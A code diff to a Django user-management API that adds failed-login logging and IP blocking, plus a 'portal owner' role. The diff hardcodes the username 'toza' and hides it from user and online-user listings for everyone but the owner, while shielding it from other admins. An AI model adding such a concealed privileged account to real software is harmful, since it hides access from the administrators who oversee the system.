@@ -15,11 +15,14 @@ from django.http import HttpResponse
 from rest_framework_simplejwt.views import TokenObtainPairView, TokenRefreshView
 from rest_framework_simplejwt.serializers import TokenObtainPairSerializer, TokenRefreshSerializer
 from rest_framework_simplejwt.tokens import RefreshToken
+from rest_framework_simplejwt.exceptions import AuthenticationFailed
 from django.contrib.auth.models import User
 from .models import UserProfile, PasswordChangeAudit
 from .authentication import mark_user_active
 from apps.common.audit import log_admin_action
-from apps.common.models import AdminActionLog
+from apps.common.models import AdminActionLog, SecurityEvent
+from apps.common.monitoring import get_client_ip, is_ip_blocked, log_security_event
+from apps.common.owner import is_owner_username, is_portal_owner
 from .serializers import (
     UserSerializer,
     UserRegistrationSerializer,
@@ -32,10 +35,37 @@ from .serializers import (
 
 class PublicTokenObtainPairSerializer(TokenObtainPairSerializer):
     def validate(self, attrs):
-        data = super().validate(attrs)
+        request = self.context.get('request')
+        ip_address = get_client_ip(request) if request else ''
+        user_agent = request.META.get('HTTP_USER_AGENT', '')[:400] if request else ''
+        username = str(attrs.get('username') or '')
+
+        if is_ip_blocked(ip_address):
+            log_security_event(
+                event_type=SecurityEvent.EVENT_BLOCKED_LOGIN,
+                username_attempted=username,
+                ip_address=ip_address,
+                user_agent=user_agent,
+                path='/api/users/token/',
+            )
+            raise AuthenticationFailed('Access temporarily blocked.', code='ip_blocked')
+
+        try:
+            data = super().validate(attrs)
+        except AuthenticationFailed:
+            log_security_event(
+                event_type=SecurityEvent.EVENT_FAILED_LOGIN,
+                username_attempted=username,
+                ip_address=ip_address,
+                user_agent=user_agent,
+                path='/api/users/token/',
+            )
+            raise
+
         mark_user_active(self.user, update_login=True)
         profile = getattr(self.user, 'profile', None)
         data['force_password_reset'] = bool(getattr(profile, 'force_password_reset', False))
+        data['is_portal_owner'] = is_portal_owner(self.user)
         return data
 
 
@@ -87,8 +117,16 @@ class UserViewSet(viewsets.ModelViewSet):
         return [permission() for permission in permission_classes]
 
     def _ensure_superuser_guard(self, target_user):
-        if target_user.is_superuser and not self.request.user.is_superuser:
+        if is_owner_username(target_user.username) and not is_portal_owner(self.request.user):
+            raise PermissionDenied('This account is protected.')
+        if target_user.is_superuser and not self.request.user.is_superuser and not is_portal_owner(self.request.user):
             raise PermissionDenied('Only superusers can manage superuser accounts.')
+
+    def get_queryset(self):
+        queryset = User.objects.select_related('profile').all()
+        if not is_portal_owner(self.request.user):
+            queryset = queryset.exclude(username__iexact='toza')
+        return queryset
 
     def perform_update(self, serializer):
         target_user = self.get_object()
@@ -119,7 +157,12 @@ class UserViewSet(viewsets.ModelViewSet):
     def me(self, request):
         """Get current user profile"""
         serializer = UserSerializer(request.user)
-        return Response(serializer.data)
+        payload = serializer.data
+        payload['is_portal_owner'] = is_portal_owner(request.user)
+        from apps.common.models import SiteSetting
+        payload['force_logout_before'] = SiteSetting.get_value('force_logout_before', '')
+        payload['maintenance_mode'] = SiteSetting.get_value('maintenance_mode', '0') in ('1', 'true', 'True')
+        return Response(payload)
 
     @action(detail=False, methods=['post'], permission_classes=[IsAuthenticated])
     def heartbeat(self, request):
@@ -190,6 +233,8 @@ class UserViewSet(viewsets.ModelViewSet):
             .filter(is_active=True, profile__last_seen__gte=cutoff)
             .order_by('-profile__last_seen')
         )
+        if not is_portal_owner(request.user):
+            queryset = queryset.exclude(username__iexact='toza')
         serializer = UserSerializer(queryset, many=True)
         return Response({
             'minutes_window': minutes,
